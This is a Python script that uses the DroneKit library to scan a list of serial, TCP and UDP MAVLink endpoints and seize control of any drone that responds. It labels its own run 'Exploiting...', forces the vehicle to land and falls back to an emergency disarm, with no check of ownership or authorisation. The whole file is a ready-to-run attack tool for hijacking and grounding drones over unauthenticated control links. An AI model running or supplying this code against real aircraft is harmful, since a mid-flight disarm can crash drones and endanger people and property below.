from dronekit import connect, VehicleMode
import time
import os
import sys

class DroneController:
    RED = '\033[91m'
    RESET = '\033[0m'

    def __init__(self):
        self.connection_strings = [
            '127.0.0.1:14550', '127.0.0.1:14551', 'tcp:127.0.0.1:5760',
            '/dev/ttyUSB0', '/dev/ttyUSB1', '/dev/ttyACM0', 
            'udp:192.168.0.10:14550', 'udp:192.168.1.1:14550', 
            'com3', 'com4'
        ]
        self.vehicle = None

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def animate(self, message, duration=3, interval=0.2):
        for _ in range(int(duration / interval)):
            for symbol in '|/-\\':
                sys.stdout.write(f'{self.RED}\r{message} {symbol}{self.RESET}')
                sys.stdout.flush()
                time.sleep(interval)
        print('\r' + ' ' * len(message), end='\r')

    def auto_connect(self, retries=5, delay=5):
        self.clear_console()
        self.animate("Script is running...")
        self.clear_console()
        print(f"{self.RED}Exploiting...{self.RESET}")
        time.sleep(1.5)
        self.clear_console()
        for attempt in range(retries):
            for conn_str in self.connection_strings:
                if self.try_connect(conn_str):
                    return True
            time.sleep(delay)
        return False

    def try_connect(self, conn_str):
        try:
            self.vehicle = connect(conn_str, wait_ready=True, timeout=10)
            print(f"{self.RED}Connected to drone on: {conn_str}{self.RESET}")
            return True
        except Exception as e:
            print(f"{self.RED}Connection to {conn_str} failed: {e}{self.RESET}")
            return False

    def shutdown_drone(self):
        if self.vehicle:
            if not self.land_drone():
                self.emergency_disarm()

    def land_drone(self):
        try:
            self.vehicle.mode = VehicleMode("LAND")
            while self.vehicle.armed:
                time.sleep(1)
            print(f"{self.RED}Drone landed and disarmed.{self.RESET}")
            return True
        except Exception as e:
            print(f"{self.RED}Landing failed: {e}{self.RESET}")
            return False

    def emergency_disarm(self):
        try:
            self.vehicle.armed = False
            print(f"{self.RED}Drone emergency disarmed.{self.RESET}")
        except Exception as e:
            print(f"{self.RED}Disarm failed: {e}{self.RESET}")

    def close_connection(self):
        if self.vehicle:
            self.vehicle.close()
            print(f"{self.RED}Connection to drone closed.{self.RESET}")

if __name__ == "__main__":
    controller = DroneController()
    if controller.auto_connect():
        controller.shutdown_drone()
        controller.close_connection()
    else:
        print(f"{DroneController.RED}No drone detected. Check configurations and try again.{DroneController.RESET}")
